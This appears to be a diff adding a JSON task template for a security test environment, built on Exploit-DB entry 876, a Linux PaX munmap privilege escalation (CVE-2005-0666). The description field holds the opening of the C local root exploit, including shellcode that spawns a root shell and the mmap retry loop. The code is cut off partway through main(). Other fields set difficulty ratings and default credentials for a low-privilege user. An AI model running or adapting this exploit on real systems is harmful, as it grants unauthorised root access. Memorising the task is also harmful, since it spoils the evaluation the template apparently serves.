@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_876",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: PaX - Double-Mirrored VMA munmap Privilege Escalation (OSVDB-14564;CVE-2005-0666)\n\nExploit source code (876.c):\n```\n/*\n *  PaX double-mirrored VMA munmap local root exploit\n *\n *  Copyright (C) 2005  Christophe Devine\n *\n *  This exploit has only been tested on Debian 3.0 running Linux 2.4.29\n *  patched with grsecurity-2.1.1-2.4.29-200501231159\n *\n *  $ gcc paxomatic.c\n *  $ ./chpax -m a.out\n *  $ ./a.out\n *  ...\n *  usage: ping [-LRdfnqrv] [-c count] [-i wait] [-l preload]\n *          [-p pattern] [-s packetsize] [-t ttl] [-I interface address] host\n *  sh-2.05a#\n *\n *  This program is free software; you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation; either version 2 of the License, or\n *  (at your option) any later version.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program; if not, write to the Free Software\n *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n */\n\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <sched.h>\n\n#include <sys/mman.h>\n#include <sys/wait.h>\n#include <asm/page.h>\n\n#define MAXTRIES 64\n#define PGD1_BASE 0x40000000\n#define PGD2_BASE 0x50000000\n#define PGD_SIZE (PAGE_SIZE * 1024)\n#define MMTARGET (PGD1_BASE + PAGE_SIZE * 2)\n\nunsigned char child_stack[PAGE_SIZE];\n\nchar exec_sh[] =                    /* from shellcode.org */\n\n    \"\\x31\\xdb\"                      /* xorl         %ebx,%ebx       */\n    \"\\x8d\\x43\\x17\"                  /* leal         0x17(%ebx),%eax */\n    \"\\xcd\\x80\"                      /* int          $0x80           */\n    \"\\x31\\xd2\"                      /* xorl         %edx,%edx       */\n    \"\\x52\"                          /* pushl        %edx            */\n    \"\\x68\\x6e\\x2f\\x73\\x68\"          /* pushl        $0x68732f6e     */\n    \"\\x68\\x2f\\x2f\\x62\\x69\"          /* pushl        $0x69622f2f     */\n    \"\\x89\\xe3\"                      /* movl         %esp,%ebx       */\n    \"\\x52\"                          /* pushl        %edx            */\n    \"\\x53\"                          /* pushl        %ebx            */\n    \"\\x89\\xe1\"                      /* movl         %esp,%ecx       */\n    \"\\xb0\\x0b\"                      /* movb         $0xb,%al        */\n    \"\\xcd\\x80\";                     /* int          $0x80           */\n\nint child_thread( void *arg )\n{\n    char *argv[2], *envp[1];\n\n    argv[0] = (char *) arg;\n    argv[1] = NULL;\n    envp[0] = NULL;\n\n    execve( (char *) arg, argv, envp );\n\n    exit( 1 );\n}\n\nint main( void )\n{\n    int i, j, n, pid, s;\n\n    for( i = 0; i < MAXTRIES; i++ )\n    {\n        printf( \"Try %d of %d\\n\", i, MAXTRIES );\n\n        if( mmap( (void *) PGD1_BASE, PAGE_SIZE, PROT_READ, MAP_FIXED |\n                  MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )\n        {\n \n```",
+  "cve": "OSVDB-14564;CVE-2005-0666",
+  "exploitdb_id": "876",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_876",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
